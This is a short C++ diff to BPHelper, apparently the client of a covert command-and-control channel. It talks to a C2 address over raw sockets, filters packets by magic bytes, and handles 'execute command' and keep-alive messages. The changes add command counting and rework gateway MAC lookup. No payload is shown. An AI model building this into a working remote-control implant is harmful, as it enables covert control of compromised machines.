@@ -8,10 +8,16 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
         case 0x02:
             //execute command then respond
             cout << "Received a Command to Execute" << endl;
+            if(eventInfo->bpRawCommand.command_num == currentCmd){
+                currentCmd++;
+            }
             return 1;
         case 0x04:
             //keep alive for future use
             cout << "Received a Keep Alive" << endl;
+            if(eventInfo->bpKeepAlive.command_num == currentCmd){
+                currentCmd ++;
+            }
             return 1;
         default:
             cout << "Not a Command or Keep Alive" << endl;
@@ -83,21 +89,22 @@ void BPHelper::requestAction() {
 BPHelper::BPHelper() {
 #ifdef __unix__
     rawSocket = RawSocket(C2IPSTR, false, true);
+    if (useGateway) {
+        nextHopMac = rawSocket.getMacOfIP(GatewayIP);
+    } else {
+        nextHopMac = rawSocket.getMacOfIP(C2IP);
+    }
 #elif defined(_WIN32) || defined(WIN32)
     rawSocket = RawSocket(false);
 #endif
-    if(useGateway){
-        nextHopMac = rawSocket.getMacOfIP(GatewayIP);
-    }else{
-        nextHopMac = rawSocket.getMacOfIP(C2IP);
-    }
+    currentCmd = 0;
 }
 
 void BPHelper::Receive() {
     while (true) {
         rawSocket.receive();
         Packet packet = rawSocket.getPacket();
-        if(!packet.empty()) {
+        if (!packet.empty()) {
             unique_ptr<info_t> info = parsePacket(packet);
             if (info->bpHeader.magic_bytes == MAGIC_BYTES) {
                 socketMutex.lock();
